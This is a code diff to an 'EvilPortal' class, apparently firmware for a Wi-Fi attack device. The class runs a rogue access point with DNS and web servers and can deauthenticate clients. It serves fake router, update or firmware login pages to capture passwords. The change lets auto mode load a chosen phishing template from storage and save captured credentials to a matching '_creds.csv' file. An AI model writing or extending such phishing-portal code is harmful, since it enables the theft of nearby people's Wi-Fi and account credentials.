@@ -15,10 +15,12 @@ static DNSServer &sharedEvilPortalDnsServer() {
 }
 
 EvilPortal::EvilPortal(
-    String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode
+    String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
+    String templateFile
 )
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
-      _backgroundMode(backgroundMode), webServer(80), _launchTime(millis()) {
+      _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80),
+      _launchTime(millis()) {
     dnsServer = &sharedEvilPortalDnsServer();
 
     _originalWifiMode = WiFi.getMode();
@@ -65,6 +67,9 @@ bool EvilPortal::setup() {
     if (apName.isEmpty()) apName = "Free Wifi";
 
     if (_autoMode) {
+        if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) {
+            return true;
+        }
         if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
             apName.indexOf("firmware") != -1 || _verifyPwd) {
             loadDefaultHtml_one();
@@ -489,6 +494,18 @@ void EvilPortal::loadCustomHtml() {
             if (apEnd != -1) { apName = firstLine.substring(apStart + 9, apEnd); }
         }
     }
+}
+
+bool EvilPortal::loadCustomHtmlFromPath(const String &path) {
+    if (path.isEmpty()) return false;
+    if (!getFsStorage(fsHtmlFile) || !fsHtmlFile->exists(path)) return false;
+
+    htmlFileName = path;
+    String fileBaseName = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
+    fileBaseName.toLowerCase();
+    outputFile = fileBaseName + "_creds.csv";
+    isDefaultHtml = false;
+    return true;
 }
 
 String EvilPortal::wifiLoadPage() {
